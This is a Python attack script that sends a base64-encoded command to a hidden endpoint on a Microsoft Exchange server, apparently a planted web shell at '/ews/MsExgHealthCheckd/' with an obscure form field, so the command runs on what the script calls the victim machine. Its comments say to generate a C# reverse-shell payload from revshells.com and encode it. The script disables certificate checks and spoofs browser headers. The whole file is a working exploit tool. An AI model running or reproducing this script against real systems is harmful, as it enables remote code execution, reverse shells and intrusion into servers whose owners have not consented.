#!/usr/bin/python3
import requests
import argparse
import warnings
import sys
import signal

### For the payload remember to create a payload first in C# from revshells.com
### then base64 encode it with "base64 -w0 ./file.exe"
### and pass that encoded payload to this script


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"[!] Ctrl+C! Exiting...")
    sys.exit(0)


# Capture Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


def check_if_https_in_url(url: str, port: int)->str:
    """
    Check the 'target' argument the user has provided
    """
    if not url.startswith('https://') and not url.startswith('http://'):
        return f"https://{url}:{port}"
    return f"{url}:{port}"


def parse_arguments()->argparse.Namespace:
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-t', '--target', help='Target IP address. Example: https://10.10.10.10', required=True, type=str)
    parser.add_argument('-c', '--command', help='Encoded base64 command to run on the victim machine.', type=str, required=True)
    parser.add_argument('-p', '--port', help='Port exposing the service. Default: 443', type=int, default=443)
    parser.add_argument('--show-warnings', action='store_false', help='Show warnings (if there are).')
    args = parser.parse_args()
    return args


def make_request(args: argparse.Namespace)->None:
    # Set generic headers
    req_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers", "Content-Type": "application/x-www-form-urlencoded"}
    # Set the target to post data
    url = check_if_https_in_url(args.target, args.port)
    post_url: str = f"{url}/ews/MsExgHealthCheckd/"
    # Set the data that will be posted
    post_data = {'sdafwe3rwe23': args.command}
    print(post_data)
    if len(args.command) < 100:
        print(f"[+] Making a request to {post_url!r} with command {args.command!r}...")
    else:
        print(f"[+] Making a request to {post_url!r} with provided command...")
    try:
        r = requests.post(post_url, headers=req_headers, data=post_data, verify=False, allow_redirects=False)
        if r.status_code != 200:
            print(f"[!] Status code {r.status_code!r}...")
            sys.exit(1)
    except Exception as e:
        print(f"[!] An error ocurred:\n{e}")
    print(f"[+] Command succesfully executed...")


def main()->None:
    args = parse_arguments()
    # By default, ignore all warnings (related to unsecure SSL connections)
    if args.show_warnings:
        warnings.filterwarnings("ignore")
    make_request(args)


if __name__ == "__main__":
    main()
